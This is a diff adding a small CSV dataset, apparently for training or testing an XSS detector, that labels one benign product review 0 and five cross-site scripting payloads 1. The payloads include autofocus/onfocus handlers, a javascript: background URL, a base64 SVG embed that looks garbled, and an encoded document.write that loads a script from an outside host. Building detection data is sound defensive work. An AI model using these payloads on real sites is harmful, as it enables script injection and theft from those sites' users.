@@ -1,0 +1,7 @@
+sentence,label
+<input onfocus=write(xss) autofocus>,1
+%22/%3E%3cBODY%20ONloAD=�documenT.WriTE(%22%3cs%22%2b%22CripT%20SRc=http://My.boX.Com/xSs.js%3E%3C/sCRiPT%3e%22)�%3e,1
+Cheap but hey it works.. Was pleasantly suprised given the low cost of this item.,0
+"<div style=""background-image: url(javascript:alert('xss'))"">",1
+"<EMBEd SRC=""DatA:imagE/svg+XML;bASe64,Phn2Zyb4BWXUcZpZDmc9imH0dh a6ly93D3CUdZmuB3jNLZIWMDAVC3znIIB4bWXUcz0IAhR0cDoVL3D3Dy53My5VCmCV mJAwmc9ZDmCIihHtbG5zOnHsaW5rpsJoDhRwOI8VD3d3lncZLM9YZY8xotK5l3hS aW5riIB2ZXjZaw9uPsIXLJAiihg9IJAIIhK9IJAIIHDPzHROpsIxotQiiGhlAwDodd0Imjaw IibPZd0IEhnzIJ48C2NyAXb0Ihr5cGU9iNRlEhqVZwNTyXnjCMlwdCI+YwxlcnQOilH TUYipoZwvc2NYaxb0PJwvc3ZnpG=="" TypE=""image/svG+Xml"" ALlowSCRiPtacCEsS=""ALWAYs""></EmBEd>",1
+"&lt;layer src=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/layer&gt;",1
